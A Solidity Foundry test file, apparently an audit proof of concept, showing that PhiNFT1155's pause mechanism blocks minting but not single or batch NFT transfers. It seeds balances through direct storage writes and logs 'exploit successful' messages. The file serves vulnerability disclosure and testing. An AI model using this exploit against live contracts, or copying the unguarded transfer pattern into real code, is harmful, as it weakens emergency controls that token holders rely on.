// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/art/PhiNFT1155.sol";
import "../src/PhiFactory.sol";
import "../src/interfaces/IPhiNFT1155.sol";
import "../src/interfaces/IPhiFactory.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

/**
 * @title IneffectivePauseMechanismExploit
 * @notice Proof-of-Concept demonstrating that the pause mechanism in PhiNFT1155 does not prevent NFT transfers
 * 
 * VULNERABILITY EXPLANATION:
 * The PhiNFT1155 contract inherits from PausableUpgradeable and implements pause()/unPause() functions.
 * However, the pause mechanism is ineffective because:
 * 1. The safeTransferFrom() and safeBatchTransferFrom() functions do NOT have the whenNotPaused modifier
 * 2. OpenZeppelin's ERC1155Upgradeable does not automatically check pause state during transfers
 * 3. Only createArtFromFactory() and claimFromFactory() have the whenNotPaused modifier
 * 
 * ATTACK VECTOR:
 * 1. Contract owner pauses the contract expecting all operations to stop
 * 2. Users can still transfer NFTs using safeTransferFrom() or safeBatchTransferFrom()
 * 3. The pause mechanism only prevents minting, not transfers
 * 
 * IMPACT:
 * - Emergency pause cannot stop NFT transfers during security incidents
 * - Regulatory compliance issues if token movement must be halted
 * - False sense of security for users and administrators
 */
contract IneffectivePauseMechanismExploit is Test {
    PhiNFT1155 public phiNFT1155Implementation;
    PhiNFT1155 public phiNFT1155;
    PhiFactory public phiFactory;
    
    address public owner;
    address public attacker;
    address public victim;
    address public protocolFeeDestination;
    
    uint256 public constant CRED_CHAIN_ID = 1;
    uint256 public constant CRED_ID = 1;
    uint256 public constant ART_ID = 1;
    uint256 public constant TOKEN_ID = 1;
    
    function setUp() public {
        // Setup test accounts
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        protocolFeeDestination = makeAddr("protocolFeeDestination");
        
        vm.deal(owner, 100 ether);
        vm.deal(attacker, 100 ether);
        
        // Deploy PhiNFT1155 implementation
        vm.startPrank(owner);
        phiNFT1155Implementation = new PhiNFT1155();
        
        // Deploy proxy and initialize
        bytes memory initData = abi.encodeWithSelector(
            PhiNFT1155.initialize.selector,
            CRED_CHAIN_ID,
            CRED_ID,
            "SIGNATURE",
            protocolFeeDestination
        );
        
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(phiNFT1155Implementation),
            initData
        );
        
        phiNFT1155 = PhiNFT1155(payable(address(proxy)));
        vm.stopPrank();
        
        // Mint some NFTs to the attacker for testing
        // We need to simulate the factory minting process
        vm.startPrank(address(phiNFT1155.phiFactoryContract()));
        
        // Create art first (this would normally be done through factory)
        vm.deal(address(phiNFT1155.phiFactoryContract()), 1 ether);
        
        vm.stopPrank();
        
        // Directly mint tokens to attacker for testing purposes
        // Since we can't easily mock the entire factory, we'll use vm.store to set balances
        vm.startPrank(owner);
        
        // Grant attacker some tokens by manipulating storage
        // In ERC1155, balances are stored in a mapping(uint256 => mapping(address => uint256))
        // We'll use a low-level approach to set the balance
        bytes32 balanceSlot = keccak256(abi.encode(attacker, keccak256(abi.encode(TOKEN_ID, uint256(6)))));
        vm.store(address(phiNFT1155), balanceSlot, bytes32(uint256(10)));
        
        vm.stopPrank();
    }
    
    /**
     * @notice Test demonstrating that NFT transfers work even when contract is paused
     * 
     * TEST FLOW:
     * 1. Verify attacker has NFT balance
     * 2. Owner pauses the contract
     * 3. Verify contract is paused
     * 4. Attacker transfers NFT to victim
     * 5. Verify transfer succeeded despite pause
     * 
     * EXPECTED BEHAVIOR: Transfer should fail when paused
     * ACTUAL BEHAVIOR: Transfer succeeds, proving the vulnerability
     */
    function testPauseDoesNotPreventTransfers() public {
        console.log("=== Testing Ineffective Pause Mechanism ===");
        
        // Step 1: Verify attacker has NFT balance
        uint256 attackerInitialBalance = phiNFT1155.balanceOf(attacker, TOKEN_ID);
        console.log("Attacker initial balance:", attackerInitialBalance);
        assertGt(attackerInitialBalance, 0, "Attacker should have NFT balance");
        
        // Step 2: Owner pauses the contract
        console.log("\n[STEP 1] Owner pauses the contract...");
        vm.prank(owner);
        phiNFT1155.pause();
        
        // Step 3: Verify contract is paused
        bool isPaused = phiNFT1155.paused();
        console.log("Contract paused status:", isPaused);
        assertTrue(isPaused, "Contract should be paused");
        
        // Step 4: Attacker attempts to transfer NFT while contract is paused
        console.log("\n[STEP 2] Attacker transfers NFT despite pause...");
        uint256 transferAmount = 5;
        
        vm.prank(attacker);
        // This should fail if pause mechanism works correctly, but it will succeed
        phiNFT1155.safeTransferFrom(
            attacker,
            victim,
            TOKEN_ID,
            transferAmount,
            ""
        );
        
        // Step 5: Verify transfer succeeded
        uint256 attackerFinalBalance = phiNFT1155.balanceOf(attacker, TOKEN_ID);
        uint256 victimBalance = phiNFT1155.balanceOf(victim, TOKEN_ID);
        
        console.log("\n=== EXPLOIT SUCCESSFUL ===");
        console.log("Attacker final balance:", attackerFinalBalance);
        console.log("Victim balance:", victimBalance);
        console.log("Transfer amount:", transferAmount);
        
        // Assertions proving the vulnerability
        assertEq(
            attackerFinalBalance,
            attackerInitialBalance - transferAmount,
            "Attacker balance should decrease"
        );
        assertEq(
            victimBalance,
            transferAmount,
            "Victim should receive tokens"
        );
        
        console.log("\n[VULNERABILITY CONFIRMED]");
        console.log("NFT transfer succeeded despite contract being paused!");
        console.log("The pause mechanism does NOT protect against transfers.");
    }
    
    /**
     * @notice Test demonstrating batch transfers also work when paused
     * 
     * This test shows that safeBatchTransferFrom() is also not protected by pause
     */
    function testPauseDoesNotPreventBatchTransfers() public {
        console.log("=== Testing Batch Transfer During Pause ===");
        
        // Setup: Give attacker multiple token types
        bytes32 balanceSlot2 = keccak256(abi.encode(attacker, keccak256(abi.encode(uint256(2), uint256(6)))));
        vm.store(address(phiNFT1155), balanceSlot2, bytes32(uint256(10)));
        
        // Pause contract
        vm.prank(owner);
        phiNFT1155.pause();
        assertTrue(phiNFT1155.paused(), "Contract should be paused");
        
        // Prepare batch transfer
        uint256[] memory ids = new uint256[](2);
        ids[0] = TOKEN_ID;
        ids[1] = 2;
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 3;
        amounts[1] = 3;
        
        // Execute batch transfer while paused
        vm.prank(attacker);
        phiNFT1155.safeBatchTransferFrom(
            attacker,
            victim,
            ids,
            amounts,
            ""
        );
        
        // Verify batch transfer succeeded
        assertEq(phiNFT1155.balanceOf(victim, TOKEN_ID), 3, "Victim should receive token 1");
        assertEq(phiNFT1155.balanceOf(victim, 2), 3, "Victim should receive token 2");
        
        console.log("[VULNERABILITY CONFIRMED]");
        console.log("Batch transfer succeeded despite pause!");
    }
    
    /**
     * @notice Test showing that minting IS correctly blocked by pause
     * 
     * This demonstrates that the whenNotPaused modifier works for some functions
     * but is missing from transfer functions
     */
    function testPauseCorrectlyBlocksMinting() public {
        console.log("=== Testing Pause Correctly Blocks Minting ===");
        
        // Pause contract
        vm.prank(owner);
        phiNFT1155.pause();
        
        // Attempt to create art (should fail)
        vm.prank(address(phiNFT1155.phiFactoryContract()));
        vm.expectRevert(); // Should revert with "Pausable: paused"
        phiNFT1155.createArtFromFactory(999);
        
        console.log("[CONFIRMED] Minting is correctly blocked by pause");
        console.log("This proves whenNotPaused modifier works, but is missing from transfers");
    }
}
